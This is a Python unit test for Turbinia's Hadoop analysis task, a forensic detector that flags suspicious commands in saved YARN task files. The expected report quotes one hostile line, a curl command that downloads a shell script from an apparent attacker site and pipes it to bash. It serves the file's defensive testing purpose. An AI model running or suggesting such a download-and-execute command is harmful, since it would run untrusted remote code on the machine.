# -*- coding: utf-8 -*-
# Copyright 2015 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for hadoop."""

from __future__ import unicode_literals

import os
import textwrap
import unittest

from turbinia import config
from turbinia.workers import hadoop


class HadoopAnalysisTest(unittest.TestCase):
  """Tests for HadoopAnalysisTask."""

  # pylint: disable=line-too-long
  _EXPECTED_REPORT = textwrap.dedent(
      """\
      #### **Found suspicious commands!**
      * **Command:**
      `1533561022643*Bcurl https://evilsite2.org/aldnalezi/mygit/raw/master/ab.sh | bash0`
      Found in file:
      `../../test_data/bad_yarn_saved_task`
      * Extracted 15 strings from 1 file(s)""")

  def setUp(self):
    self.filedir = os.path.dirname(os.path.realpath(__file__))
    self.test_file = os.path.join(
        self.filedir, '..', '..', 'test_data', 'bad_yarn_saved_task')

  def testAnalyzeHadoopAppRoot(self):
    """Tests the _AnalyzeHadoopAppRoot method."""
    config.LoadConfig()
    task = hadoop.HadoopAnalysisTask()
    self.maxDiff = None
    # pylint: disable=protected-access
    (report, priority, summary) = task._AnalyzeHadoopAppRoot([self.test_file],
                                                             self.filedir)
    report = '\n'.join(report)
    self.assertEqual(priority, 10)
    self.assertEqual(summary, 'Found suspicious commands!')
    self.assertEqual(report, self._EXPECTED_REPORT)
